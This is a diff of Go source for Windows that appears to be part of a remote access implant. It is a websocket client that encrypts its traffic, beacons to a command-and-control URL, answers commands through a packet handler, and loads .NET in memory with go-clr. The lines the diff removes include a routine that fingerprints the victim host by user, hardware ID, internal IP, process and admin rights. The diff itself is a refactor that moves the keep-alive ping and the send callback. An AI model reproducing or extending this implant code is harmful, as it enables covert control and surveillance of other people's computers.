@@ -1,28 +1,19 @@
 //go:build windows
-// +build windows
 
-package ws
+package Protocol
 
 import (
+	"fmt"
 	"main/Encrypt"
-	HandlePacket "main/HandlePacket/ws"
+	HandlePacket "main/HandlePacket/windows"
 	"main/Helper/handle"
-	"main/Helper/syscalls"
-	"main/MessagePack"
 	"main/PcInfo"
 	"runtime"
-	"sync"
 	"time"
 
 	"github.com/Ne0nd0g/go-clr"
 	"github.com/togettoyou/wsc"
 )
-
-type Client struct {
-	Connection *wsc.Wsc
-	lock       sync.Mutex
-	keepAlive  *time.Ticker
-}
 
 func (c *Client) SendData(data []byte) {
 	endata, err := Encrypt.Encrypt(data)
@@ -31,29 +22,11 @@ func (c *Client) SendData(data []byte) {
 	}
 	c.Connection.SendBinaryMessage(endata)
 }
-func Run_main(url string) {
+func WsRun() {
 	client := &Client{}
-	client.Connect(url)
-}
+	fmt.Println(PcInfo.URL)
+	client.Connect(PcInfo.URL)
 
-func SendInfo() []byte {
-	msgpack := new(MessagePack.MsgPack)
-	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientInfo")
-	msgpack.ForcePathObject("OS").SetAsString(syscalls.GetWindowsVersion())
-	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
-	msgpack.ForcePathObject("User").SetAsString(PcInfo.GetCurrentUser())
-	msgpack.ForcePathObject("LANip").SetAsString(PcInfo.GetInternalIP())
-	msgpack.ForcePathObject("ProcessName").SetAsString(PcInfo.GetProcessName())
-	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.ProcessID)
-	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
-	msgpack.ForcePathObject("SleepTime").SetAsString("10")
-	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
-	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)
-	msgpack.ForcePathObject("Admin").SetAsString(syscalls.IsAdmin())
-	msgpack.ForcePathObject("CLRVersion").SetAsString(PcInfo.ClrVersion)
-	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
-	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.ClientComputer)
-	return msgpack.Encode2Bytes()
 }
 
 func (c *Client) Connect(url string) {
@@ -118,7 +91,9 @@ func (c *Client) Connect(url string) {
 
 	c.Connection.OnBinaryMessageReceived(func(data []byte) {
 		go func() {
-			HandlePacket.Read(data, c.Connection)
+			HandlePacket.Read(data, c.Connection, func(data []byte, conn *wsc.Wsc) {
+				c.SendData(data)
+			})
 		}()
 	})
 	c.keepAlive = time.NewTicker(5 * time.Second)
@@ -126,7 +101,9 @@ func (c *Client) Connect(url string) {
 	c.Connection.Connect()
 	go func() {
 		for range c.keepAlive.C {
-			c.KeepAlivePacket()
+			KeepAlivePacket(c.Connection, func(data []byte, conn *wsc.Wsc) {
+				c.SendData(data)
+			})
 		}
 	}()
 	for {
@@ -135,11 +112,4 @@ func (c *Client) Connect(url string) {
 			return
 		}
 	}
-}
-
-func (c *Client) KeepAlivePacket() {
-	msgpack := new(MessagePack.MsgPack)
-	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientPing")
-	msgpack.ForcePathObject("Message").SetAsString("DDDD")
-	c.SendData(msgpack.Encode2Bytes())
 }
